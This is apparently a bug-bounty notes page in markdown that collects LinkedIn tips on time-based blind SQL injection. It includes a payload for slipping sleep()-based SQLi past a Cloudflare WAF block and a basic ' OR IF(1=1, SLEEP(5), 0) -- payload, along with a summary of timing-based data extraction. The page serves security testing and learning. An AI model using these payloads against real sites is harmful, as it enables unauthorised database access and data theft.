# SQLI


* ## Cloudflare 403 bypass to time-based blind SQLi

   [linked_in_post](https://www.linkedin.com/posts/deepak-saini-cyber_cloudflare-403-bypass-to-time-based-blind-activity-7339491633870065664-yg2e/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

  <details>

    Cloudflare 403 bypass to time-based blind SQLi:

    ```css
    PL: (select(0)from(select(sleep(10)))v)   ----→ 403
    but PL: (select(0)from(select(sleep(6)))v)/*'%2B(select(0)from(select(sleep(6)))v)%2B'%5C"%2B(select(0)from(select(sleep(6)))v)   ---→ Time-based Blind SQLi 
    ```

  </details>



----
----


## `Time-Based Blind SQLi → No Output? Use Time!`


[linkedin_post]()

<details>




```
Time-Based Blind SQLi → No Output? Use Time!
 App doesn’t return errors or results
 Attacker uses payload like: ' OR IF(1=1, SLEEP(5), 0) --
 Measures response delay
 True → delay, False → fast
 Extracts data using response timing
```

<img width="919" height="397" alt="image" src="https://github.com/user-attachments/assets/4e27ce81-66d6-4412-91c5-04941997396d" />


   
</details>





---
---


<details>
   <summary>blind time based</summary>


<img width="667" height="781" alt="image" src="https://github.com/user-attachments/assets/cb6df118-6c82-4719-84d8-f4a5061582f9" />


   
</details>




---
----


## **`How to Find Blind Time-Based SQL Injection (BSQLI)`**


[linkedin_post](https://www.linkedin.com/posts/rix4uni_bugbountytips-bugbounty-bugbountytips-ugcPost-7370382285960826880-IkzS/?utm_source=share&utm_medium=member_android&rcm=ACoAAEvbB6gBsfqHvlwzrauR1IimSlFa7C0L4ok)

---
---

















